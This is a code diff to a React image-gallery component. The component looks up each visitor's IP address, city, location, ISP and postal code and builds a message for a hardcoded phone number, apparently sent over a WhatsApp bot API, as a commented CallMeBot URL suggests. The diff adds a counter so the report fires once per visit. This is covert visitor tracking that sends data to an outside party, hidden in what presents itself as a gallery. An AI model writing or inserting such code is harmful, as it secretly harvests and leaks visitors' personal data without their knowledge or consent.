@@ -15,6 +15,8 @@ const ImagesGalleryX = () => {
   const [cora, setCora] = useState(0);
   const [message, setMessage] = useState(false);
   const [ipInfo, setIpInfo] = useState([]);
+  const [enviado, setEnviado] = useState(0);
+
 
   async function getIpClient() {
     try {
@@ -31,7 +33,8 @@ const ImagesGalleryX = () => {
 
     getIpClient();
 
-    console.log(ipInfo);
+    if(enviado < 1){
+      console.log(ipInfo);
     let rta = ipInfo?.data?.city + " " +ipInfo?.data?.country+ " " +ipInfo?.data?.ip+ " " +ipInfo?.data?.loc+ " " +ipInfo?.data?.org+ " " +ipInfo?.data?.postal+ " " +ipInfo?.data?.region;
     let userInfo = {
       phone: '573102796853',
@@ -45,10 +48,13 @@ const ImagesGalleryX = () => {
 }).catch(e => {
     console.log(e);
 })
+setEnviado(enviado+2);
+
+    }    
     
     //https://api.callmebot.com/whatsapp.php?phone=+34123123123&text=This+is+a+test+from+CallMeBot&apikey=1234567890
     
-  }, [ipInfo]);
+  }, [ipInfo, enviado]);
 
   const handleSelect = (selectedIndex, e) => {
     setIndex(selectedIndex);
